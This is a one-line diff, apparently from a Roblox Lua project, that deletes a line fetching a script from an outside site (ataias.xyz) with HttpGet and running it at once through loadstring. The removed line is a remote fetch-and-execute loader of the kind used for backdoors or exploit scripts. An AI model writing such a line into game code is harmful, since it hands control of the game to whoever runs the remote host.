@@ -1,1 +1,0 @@
-loadstring(game:HttpGet'https://ataias.xyz/getScript?ID=2b5d10914455ca6e4013bc2aa49ed62b')()
